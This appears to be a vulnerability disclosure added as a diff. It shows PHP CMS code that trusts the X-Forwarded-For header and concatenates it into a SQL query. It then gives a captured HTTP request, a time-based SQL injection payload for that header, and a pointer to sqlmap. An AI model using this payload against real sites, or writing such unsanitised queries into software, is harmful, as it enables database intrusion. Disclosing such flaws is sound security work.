@@ -1,0 +1,64 @@
+Build environment with PHP5.
+------------------------------------------------------------------------------------
+affected source code file: 
+/system/basic/func/global.func.php
+/system/web/items/items.class.php
+------------------------------------------------------------------------------------
+affected source code:
+
+  ......................
+     /**
+       * Get the real ip of the visitor 
+       * 
+       * @return strong
+     */
+    function getIP(){
+      if(isset($_SERVER["HTTP_X_FORWARDED_FOR"])){
+        $ip = $_SERVER["HTTP_X_FORWARDED_FOR"];
+      }else if(isset($_SERVER["HTTP_CLIENT_IP"])){
+        $ip = $_SERVER["HTTP_CLIENT_IP"];
+      }else{
+        $ip = $_SERVER["REMOTE_ADDR"];
+      }
+        return $ip;
+    }
+  ......................
+  
+  ......................
+  	if($number==7){
+				if(arrExist($G['config'],'search_open')){
+					$G['keyword'] = $keyword = arrExist($G,"get|{$G['config']['search_keyword']}");
+					if(isset($keyword) && $keyword!==''){
+						$G['config']['search_null'] = str_replace('[keyword]',"[<strong>{$keyword}</strong>]",$G['config']['search_null']);
+						$ip = getIP();
+						$time = TIME;
+						if($sear = mysql::select_one('id','search',"parent='{$G['items']['id']}' AND keyword='{$keyword}' AND ip='{$ip}' AND ctime>{$time}-3600")){
+							mysql::update(array('ctime'=>$time),'search',"id='{$sear['id']}'");
+						}else{
+							mysql::insert(array('parent'=>$G['items']['id'],'keyword'=>$keyword,'ip'=>$ip,'ctime'=>$time),'search');
+   .....................
+  
+  -------------------------------------------------------------------------------------------------------------------------------
+  affected reason:
+    We can see that the above code does not perform security processing on $ip， and because ip can be forged through X-Forwarded-For，
+    so we can perform xff SQL injection。
+  -------------------------------------------------------------------------------------------------------------------------------
+  affected executable: 
+    1. First visit the front desk website: http://xxx.xxx.com/search/?keyword=1
+    2. Refresh the page and use burpsuite to capture packets. The data packets are as follows: 
+        GET /search/?keyword=1 HTTP/1.1
+        Host: xxx.xxx.com
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        Cookie: PHPSESSID=opvv0v5330riho6gs20407b9v5
+        DNT: 1
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+    3. We can add X-Forwarded-For to the post packet, and then construct the value of X-Forwarded-For: 1.1.1.1' and sleep(5)-- a 
+    4. Put the specially constructed data packet out, you can see that the success delay is 5 seconds 
+    5. Then, we can use tools like sqlmap for more information.
+    
+    
+  
